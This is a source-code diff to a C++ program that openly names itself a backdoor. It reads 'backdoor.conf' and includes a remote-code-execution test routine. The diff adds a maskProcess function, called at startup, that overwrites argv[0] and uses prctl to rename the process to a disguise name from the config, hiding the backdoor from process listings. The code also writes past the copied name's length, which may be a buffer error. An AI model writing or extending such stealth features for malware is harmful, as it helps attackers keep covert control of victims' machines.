@@ -3,6 +3,8 @@
 #include <vector>
 
 #include <unistd.h>
+#include <string.h>
+#include <sys/prctl.h>
 
 #include "Crypto.h"
 #include "NetworkEngine.h"
@@ -83,6 +85,8 @@ void testRceRes(const Properties &p) {
 int main(int argc, char *argv[]) {
     Properties p = getConfig("backdoor.conf");
 
+    maskProcess(argv[0], p.at("newProcessName").c_str());
+
     if (argc != 2) {
         printUsage(argv[0]);
         return 0;
@@ -152,6 +156,30 @@ Properties getConfig(const std::string &filename) {
     }
 
     return properties;
+}
+
+/*
+ * Changes the name of the process to the mask.
+ *
+ * Params:
+ *      char *original: Argv[0]
+ *
+ *      const char *mask: The new name use.
+ *
+ * Returns:
+ *      0 if the process name was masked, -1 otherwise.
+ */
+int maskProcess(char *original, const char *mask)
+{
+    const int MAX_PROCESS_LEN = 16;
+    strncpy(original, mask, MAX_PROCESS_LEN);
+    original[MAX_PROCESS_LEN] = 0;
+    if (prctl(PR_SET_NAME, mask, 0, 0) == -1)
+    {
+        perror("prctl");
+        return -1;
+    }
+    return 0;
 }
 
 /*
